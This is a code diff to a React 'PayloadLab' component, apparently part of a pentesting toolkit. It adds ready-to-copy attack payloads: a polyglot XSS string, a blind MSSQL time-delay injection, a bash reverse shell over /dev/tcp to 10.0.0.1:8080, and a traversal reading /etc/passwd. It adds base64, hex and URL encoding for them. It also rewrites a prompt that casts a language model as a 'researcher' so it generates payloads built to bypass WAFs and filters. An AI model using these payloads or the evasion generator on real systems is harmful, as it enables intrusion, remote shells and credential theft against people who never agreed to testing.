@@ -1,5 +1,5 @@
 /* COPYRIGHT ALEN PEPA */
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { 
   Terminal as TerminalIcon, 
   Copy, 
@@ -12,13 +12,20 @@ import {
   Bot,
   Sparkles,
   Loader2,
-  Trash2
+  Trash2,
+  Settings,
+  Cpu,
+  Globe,
+  Database,
+  RefreshCw,
+  FileCode2
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import { cn } from '@/src/lib/utils';
 import { logToTerminal } from './Terminal';
 
-type PayloadType = 'xss' | 'sqli' | 'rce' | 'lfi' | 'ssrf' | 'custom';
+type PayloadType = 'xss' | 'sqli' | 'rce' | 'lfi' | 'ssrf' | 'xxe' | 'cmd' | 'ssti' | 'custom';
+type EncodingType = 'none' | 'base64' | 'url' | 'hex' | 'html';
 
 interface Payload {
   id: string;
@@ -27,31 +34,81 @@ interface Payload {
   content: string;
   description: string;
   risk: 'low' | 'medium' | 'high' | 'critical';
+  encoding: EncodingType;
+  stats: {
+    stealth: number;
+    complexity: number;
+    impact: number;
+  };
 }
 
 export default function PayloadLab() {
   const [activeType, setActiveType] = useState<PayloadType>('xss');
   const [customPrompt, setCustomPrompt] = useState('');
+  const [targetOS, setTargetOS] = useState<'linux' | 'windows' | 'macos' | 'any'>('any');
+  const [targetLang, setTargetLang] = useState<'php' | 'node' | 'python' | 'java' | 'any'>('any');
   const [generating, setGenerating] = useState(false);
   const [payloads, setPayloads] = useState<Payload[]>([
     {
       id: '1',
       type: 'xss',
-      name: 'Basic Alert',
-      content: '<script>alert(1)</script>',
-      description: 'Standard XSS test payload to verify script execution.',
-      risk: 'low'
+      name: 'Polyglot XSS',
+      content: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+      description: 'Advanced polyglot payload designed to execute in multiple contexts.',
+      risk: 'high',
+      encoding: 'none',
+      stats: { stealth: 85, complexity: 90, impact: 60 }
     },
     {
       id: '2',
       type: 'sqli',
-      name: 'Auth Bypass',
-      content: "' OR '1'='1",
-      description: 'Classic SQL injection to bypass authentication forms.',
-      risk: 'high'
+      name: 'Time-Based Blind',
+      content: "1'; WAITFOR DELAY '0:0:10'--",
+      description: 'Time-based blind SQL injection for MS SQL Server.',
+      risk: 'critical',
+      encoding: 'none',
+      stats: { stealth: 95, complexity: 70, impact: 90 }
+    },
+    {
+      id: '3',
+      type: 'rce',
+      name: 'Reverse Shell (Bash)',
+      content: "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+      description: 'Standard bash reverse shell payload.',
+      risk: 'critical',
+      encoding: 'none',
+      stats: { stealth: 40, complexity: 30, impact: 100 }
+    },
+    {
+      id: '4',
+      type: 'lfi',
+      name: 'Path Traversal (Null Byte)',
+      content: "../../../../../../../../../../../../etc/passwd%00",
+      description: 'Directory traversal attempting to read /etc/passwd using null byte injection.',
+      risk: 'high',
+      encoding: 'none',
+      stats: { stealth: 60, complexity: 40, impact: 80 }
     }
   ]);
   const [copiedId, setCopiedId] = useState<string | null>(null);
+
+  const encodePayload = (content: string, encoding: EncodingType) => {
+    try {
+      switch (encoding) {
+        case 'base64': return btoa(content);
+        case 'url': return encodeURIComponent(content);
+        case 'hex': return content.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+        case 'html': return content.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
+        default: return content;
+      }
+    } catch (e) {
+      return content;
+    }
+  };
+
+  const updateEncoding = (id: string, encoding: EncodingType) => {
+    setPayloads(payloads.map(p => p.id === id ? { ...p, encoding } : p));
+  };
 
   const generatePayload = async () => {
     if (!customPrompt) return;
@@ -63,17 +120,24 @@ export default function PayloadLab() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
+          contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a highly advanced, technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
+          Target OS: ${targetOS}
+          Target Language/Framework: ${targetLang}
           
           Provide the output in JSON format:
           {
-            "name": "Short descriptive name",
-            "content": "The actual payload string",
-            "description": "Brief technical explanation",
-            "risk": "low/medium/high/critical"
+            "name": "Short descriptive name (e.g., 'Polyglot XSS Bypass')",
+            "content": "The actual payload string (raw, unencoded)",
+            "description": "Brief technical explanation of how it works and what it bypasses",
+            "risk": "low/medium/high/critical",
+            "stats": {
+              "stealth": <number 0-100>,
+              "complexity": <number 0-100>,
+              "impact": <number 0-100>
+            }
           }` }] }],
           config: {
-            systemInstruction: "You are a CyberSuite OS Payload Generator. Be technical and precise. Only provide the JSON object. Do not include markdown blocks.",
+            systemInstruction: "You are a CyberSuite OS Advanced Payload Generator. Be highly technical, precise, and creative. Generate payloads that bypass common WAFs or filters. Only provide the JSON object. Do not include markdown blocks.",
             responseMimeType: "application/json"
           }
         })
@@ -88,6 +152,7 @@ export default function PayloadLab() {
       const newPayload: Payload = {
         id: Math.random().toString(36).substr(2, 9),
         type: activeType,
+        encoding: 'none',
         ...data
       };
 
@@ -103,9 +168,10 @@ export default function PayloadLab() {
   };
 
   const copyToClipboard = (payload: Payload) => {
-    navigator.clipboard.writeText(payload.content);
+    const contentToCopy = encodePayload(payload.content, payload.encoding);
+    navigator.clipboard.writeText(contentToCopy);
     setCopiedId(payload.id);
-    logToTerminal(`Payload copied: ${payload.name}`, 'info');
+    logToTerminal(`Payload copied: ${payload.name} (${payload.encoding} encoded)`, 'info');
     setTimeout(() => setCopiedId(null), 2000);
   };
 
@@ -133,7 +199,7 @@ export default function PayloadLab() {
 
             <div className="space-y-4">
               <div className="grid grid-cols-3 gap-2">
-                {(['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'custom'] as PayloadType[]).map((type) => (
+                {(['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe', 'cmd', 'ssti', 'custom'] as PayloadType[]).map((type) => (
                   <button
                     key={type}
                     onClick={() => setActiveType(type)}
@@ -147,6 +213,36 @@ export default function PayloadLab() {
                     {type}
                   </button>
                 ))}
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <label className="text-[10px] font-mono text-gray-500 uppercase tracking-widest px-1">Target OS</label>
+                  <select 
+                    value={targetOS}
+                    onChange={(e) => setTargetOS(e.target.value as any)}
+                    className="w-full bg-black/40 border border-cyber-border rounded-xl px-4 py-2.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 appearance-none"
+                  >
+                    <option value="any">Any OS</option>
+                    <option value="linux">Linux</option>
+                    <option value="windows">Windows</option>
+                    <option value="macos">macOS</option>
+                  </select>
+                </div>
+                <div className="space-y-2">
+                  <label className="text-[10px] font-mono text-gray-500 uppercase tracking-widest px-1">Framework</label>
+                  <select 
+                    value={targetLang}
+                    onChange={(e) => setTargetLang(e.target.value as any)}
+                    className="w-full bg-black/40 border border-cyber-border rounded-xl px-4 py-2.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 appearance-none"
+                  >
+                    <option value="any">Any Framework</option>
+                    <option value="php">PHP</option>
+                    <option value="node">Node.js</option>
+                    <option value="python">Python</option>
+                    <option value="java">Java</option>
+                  </select>
+                </div>
               </div>
 
               <div className="space-y-2">
@@ -205,38 +301,50 @@ export default function PayloadLab() {
                   className="bg-cyber-card border border-cyber-border rounded-2xl p-5 hover:border-red-500/30 transition-all group"
                 >
                   <div className="flex items-start justify-between gap-4 mb-4">
-                    <div className="space-y-1">
-                      <div className="flex items-center gap-2">
+                    <div className="space-y-2">
+                      <div className="flex flex-wrap items-center gap-2">
                         <span className={cn(
                           "text-[9px] px-2 py-0.5 rounded-full font-mono uppercase border",
                           payload.type === 'xss' ? "bg-blue-500/10 text-blue-400 border-blue-500/20" :
                           payload.type === 'sqli' ? "bg-purple-500/10 text-purple-400 border-purple-500/20" :
-                          "bg-red-500/10 text-red-400 border-red-500/20"
+                          payload.type === 'rce' ? "bg-red-500/10 text-red-400 border-red-500/20" :
+                          "bg-amber-500/10 text-amber-400 border-amber-500/20"
                         )}>
                           {payload.type}
                         </span>
                         <span className={cn(
                           "text-[9px] px-2 py-0.5 rounded-full font-mono uppercase border",
-                          payload.risk === 'critical' ? "bg-red-500/20 text-red-500 border-red-500/30" :
+                          payload.risk === 'critical' ? "bg-red-500/20 text-red-500 border-red-500/30 shadow-[0_0_10px_rgba(239,68,68,0.2)]" :
                           payload.risk === 'high' ? "bg-orange-500/20 text-orange-500 border-orange-500/30" :
                           "bg-cyber-green/20 text-cyber-green border-cyber-green/30"
                         )}>
                           {payload.risk} risk
                         </span>
+                        <select
+                          value={payload.encoding}
+                          onChange={(e) => updateEncoding(payload.id, e.target.value as EncodingType)}
+                          className="bg-black/60 border border-cyber-border rounded-md px-2 py-0.5 text-[9px] font-mono text-gray-400 focus:outline-none focus:border-red-500/50"
+                        >
+                          <option value="none">Raw</option>
+                          <option value="base64">Base64</option>
+                          <option value="url">URL Encode</option>
+                          <option value="hex">Hex</option>
+                          <option value="html">HTML Entity</option>
+                        </select>
                       </div>
-                      <h4 className="text-white font-bold group-hover:text-red-400 transition-colors">{payload.name}</h4>
+                      <h4 className="text-white font-bold group-hover:text-red-400 transition-colors text-lg">{payload.name}</h4>
                     </div>
                     <div className="flex items-center gap-2">
                       <button 
                         onClick={() => copyToClipboard(payload)}
-                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-white transition-colors"
+                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-white hover:border-white/30 transition-all"
                         title="Copy Payload"
                       >
                         {copiedId === payload.id ? <Check size={16} className="text-cyber-green" /> : <Copy size={16} />}
                       </button>
                       <button 
                         onClick={() => deletePayload(payload.id)}
-                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-red-500 transition-colors"
+                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-red-500 hover:border-red-500/30 transition-all"
                         title="Delete"
                       >
                         <Trash2 size={16} />
@@ -244,13 +352,40 @@ export default function PayloadLab() {
                     </div>
                   </div>
 
-                  <div className="bg-black/60 border border-cyber-border rounded-xl p-4 font-mono text-xs text-red-400 break-all mb-4">
-                    {payload.content}
+                  <div className="bg-black/80 border border-cyber-border rounded-xl p-4 font-mono text-xs text-red-400 break-all mb-4 relative overflow-hidden">
+                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500/0 via-red-500/50 to-red-500/0" />
+                    <FileCode2 size={14} className="absolute top-2 right-2 text-red-500/20" />
+                    {encodePayload(payload.content, payload.encoding)}
                   </div>
 
-                  <div className="flex items-center gap-2 text-[10px] text-gray-500 italic">
-                    <AlertTriangle size={12} className="text-yellow-500/50" />
-                    {payload.description}
+                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+                    <div className="md:col-span-3 flex items-start gap-2 text-[11px] text-gray-400 leading-relaxed">
+                      <AlertTriangle size={14} className="text-yellow-500/50 shrink-0 mt-0.5" />
+                      {payload.description}
+                    </div>
+                    
+                    {payload.stats && (
+                      <div className="flex flex-col gap-2 border-l border-white/5 pl-4">
+                        <div className="flex items-center justify-between">
+                          <span className="text-[9px] font-mono text-gray-500 uppercase">Stealth</span>
+                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
+                            <div className="h-full bg-blue-500" style={{ width: `${payload.stats.stealth}%` }} />
+                          </div>
+                        </div>
+                        <div className="flex items-center justify-between">
+                          <span className="text-[9px] font-mono text-gray-500 uppercase">Complexity</span>
+                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
+                            <div className="h-full bg-purple-500" style={{ width: `${payload.stats.complexity}%` }} />
+                          </div>
+                        </div>
+                        <div className="flex items-center justify-between">
+                          <span className="text-[9px] font-mono text-gray-500 uppercase">Impact</span>
+                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
+                            <div className="h-full bg-red-500" style={{ width: `${payload.stats.impact}%` }} />
+                          </div>
+                        </div>
+                      </div>
+                    )}
                   </div>
                 </motion.div>
               ))}
